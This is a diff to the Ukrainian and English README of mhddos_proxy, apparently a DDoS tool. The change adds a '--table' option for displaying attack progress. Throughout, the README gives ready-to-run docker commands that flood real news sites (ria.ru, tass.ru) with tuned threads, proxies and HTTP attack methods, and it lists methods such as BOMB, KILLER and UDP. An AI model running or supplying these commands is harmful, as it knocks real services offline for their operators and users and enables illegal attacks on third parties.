@@ -1,5 +1,5 @@
 ## Оновлення
-- **28.03.2022** Додано табличний вивід (дуже дякую, @alexneo2003). Параметр `--debug` більше не використовується 
+- **28.03.2022** Додано табличний вивід `--table` (дуже дякую, @alexneo2003).
 - **27.03.2022** 
   - Дозволено запуск методів DBG, BOMB (дякую @drew-kun за PR) та KILLER для відповідності оригінальному MHDDoS.
   - Метод DGB оновлено, проте працездатність залишається під питанням - 
@@ -96,6 +96,11 @@ UDP - **ТУТ ОБОВ'ЯЗКОВО VPN**
 
     docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 3000 https://ria.ru https://tass.ru
 
+Щоб переглянути інформацію про хід атаки у табличній формі, додайте прапорець `--table`
+
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table https://ria.ru https://tass.ru
+
+
 Змінити частоту оновлення проксі (за замовчуванням - кожні 15 хвилин) - `-p SECONDS`
 
     docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -p 1200 https://ria.ru https://tass.ru
@@ -116,6 +121,7 @@ UDP - **ТУТ ОБОВ'ЯЗКОВО VPN**
                      [-t THREADS] 
                      [-p PERIOD]
                      [-c URL]
+                     [--table]
                      [--rpc RPC] 
                      [--http-methods METHOD [METHOD ...]]
 
@@ -127,6 +133,7 @@ UDP - **ТУТ ОБОВ'ЯЗКОВО VPN**
       -c, --config URL       URL to a config file (list of targets in plain text)
       -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
       -p, --period 900       How often to update the proxies (default is 900)
+      --table                Print log as table
       --vpn                  Disable proxies to use VPN
       --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
       --http-methods GET     List of HTTP(s) attack methods to use.
@@ -189,6 +196,7 @@ Note that **python** is used instead of python3.
                      [-t THREADS] 
                      [-p PERIOD]
                      [-c URL]
+                     [--table]
                      [--rpc RPC] 
                      [--http-methods METHOD [METHOD ...]]
 
@@ -200,6 +208,7 @@ Note that **python** is used instead of python3.
       -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
       -c, --config URL       URL to a config file (list of targets in plain text)
       -p, --period 900       How often to update the proxies (default is 900)
+      --table                Print log as table
       --vpn                  Disable proxies to use VPN
       --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
       --http-methods GET     List of HTTP(s) attack methods to use.
